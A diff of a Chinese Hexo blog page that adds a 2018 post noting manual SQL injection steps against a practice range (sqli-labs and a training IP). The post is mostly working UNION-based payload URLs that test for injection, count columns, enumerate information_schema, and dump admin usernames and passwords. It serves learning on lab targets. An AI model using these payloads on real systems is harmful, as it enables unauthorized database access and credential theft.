@@ -3,19 +3,19 @@
 <head>
   <meta charset="utf-8">
   
-  <title>Tags | 黑色褪去，呼唤君之名</title>
+  <title>注入学习 | 黑色褪去，呼唤君之名</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="小小白">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Tags">
-<meta property="og:url" content="http://yoursite.com/tags/index.html">
+  <meta name="description" content="1、手工测试是否存在注入点靶场： sqli-labs （sql注入学习游戏教程）     下载地址：https://github.com/Audi-1/sqli-labs     封神台   http://hack.zkaq.org/?a=battle (注释：# , – ) http://120.203.13.75:6815/?id=1&amp;#39;  （报错） http://120.203.13.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="注入学习">
+<meta property="og:url" content="http://yoursite.com/2018/10/17/注入学习/index.html">
 <meta property="og:site_name" content="黑色褪去，呼唤君之名">
-<meta property="og:description" content="小小白">
+<meta property="og:description" content="1、手工测试是否存在注入点靶场： sqli-labs （sql注入学习游戏教程）     下载地址：https://github.com/Audi-1/sqli-labs     封神台   http://hack.zkaq.org/?a=battle (注释：# , – ) http://120.203.13.75:6815/?id=1&amp;#39;  （报错） http://120.203.13.">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-10-16T10:10:45.543Z">
+<meta property="og:updated_time" content="2018-10-17T12:25:01.325Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Tags">
-<meta name="twitter:description" content="小小白">
+<meta name="twitter:title" content="注入学习">
+<meta name="twitter:description" content="1、手工测试是否存在注入点靶场： sqli-labs （sql注入学习游戏教程）     下载地址：https://github.com/Audi-1/sqli-labs     封神台   http://hack.zkaq.org/?a=battle (注释：# , – ) http://120.203.13.75:6815/?id=1&amp;#39;  （报错） http://120.203.13.">
   
     <link rel="alternate" href="/atom.xml" title="黑色褪去，呼唤君之名" type="application/atom+xml">
   
@@ -68,14 +68,81 @@
   </div>
 </div>
 
-        <section id="main"><article  class="animated rubberBand article article-type-" >
-  <div class="article-inner">
-    <div class="tag-box">
-      <h1>标签</h1>
-      
-    </div>
+        <section id="main"><article id="post-注入学习" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/10/17/注入学习/" class="article-date">
+  <time class="post-time" datetime="2018-10-17T09:48:33.000Z" itemprop="datePublished">
+    <span class="post-month">10月</span><br/>
+    <span class="post-day">17</span>
+  </time>
+</a>
+   
   </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      注入学习
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+<div class="article-entry" itemprop="articleBody">
+  
+  	
+  	
+  	  <h3 id="1、手工测试是否存在注入点"><a href="#1、手工测试是否存在注入点" class="headerlink" title="1、手工测试是否存在注入点"></a>1、手工测试是否存在注入点</h3><p>靶场：</p>
+<p>sqli-labs （sql注入学习游戏教程）     下载地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a>    </p>
+<p>封神台   <a href="http://hack.zkaq.org/?a=battle" target="_blank" rel="noopener">http://hack.zkaq.org/?a=battle</a></p>
+<p>(注释：# , – )</p>
+<p><code>http://120.203.13.75:6815/?id=1&#39;  （报错）</code></p>
+<p><code>http://120.203.13.75:6815/?id=1 and 1=1 --+ （正常）</code></p>
+<p><code>http://120.203.13.75:6815/?id=1 and 1=2 --+     （报错）</code></p>
+<p>存在注入</p>
+<h3 id="2、猜字段"><a href="#2、猜字段" class="headerlink" title="2、猜字段"></a>2、猜字段</h3><p><code>http://120.203.13.75:6815/?id=1 order by 2   （尝试不同的字段数直到页面在正常和不正常之间）</code></p>
+<h3 id="3、查库名"><a href="#3、查库名" class="headerlink" title="3、查库名"></a>3、查库名</h3><p><code>http://120.203.13.75:6815/?id=1 union select 1,database() limit 1,1 --+</code> </p>
+<p>（(union  联合语句） （limit子句可以用于强制select语句返回制定的记录数，limit接受一个或两个数字的参数，如果给定两个参数第一个指定返回记录行的偏移量，第二个指定返回记录行的最大数目。） ）</p>
+<h3 id="4、查表名"><a href="#4、查表名" class="headerlink" title="4、查表名"></a>4、查表名</h3><p><code>http://120.203.13.75:6815/?id=1 union select 1,table_name from information_schema.tables where table_schema = &#39;maoshe&#39; limit 1,1--</code> </p>
+<h3 id="5、查字段"><a href="#5、查字段" class="headerlink" title="5、查字段"></a>5、查字段</h3><p><code>http://120.203.13.75:6815/?id=1 union select 1,column_name from information_schema.columns where table_schema = &#39;maoshe&#39; and table_name = &#39;admin&#39; limit 1,1 --</code> </p>
+<h3 id="6、查字段内容"><a href="#6、查字段内容" class="headerlink" title="6、查字段内容"></a>6、查字段内容</h3><p><code>http://120.203.13.75:6815/?id=1 union select 1,username from admin limit 1,1 --</code> </p>
+<p><code>http://120.203.13.75:6815/?id=1 union select 1,group_concat(id,username,password) from admin limit 1,1 --</code> </p>
+
+  	
+  
+</div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/10/17/注入学习/" data-id="cjnd4qo6f00039wvg5mrfeepx" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/10/17/Hexo 自动添加 Read More 标记/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">Hexo 自动添加 Read More 标记</div>
+    </a>
+  
+</nav>
+
+  
 </article>
+
+
 
 </section>
         
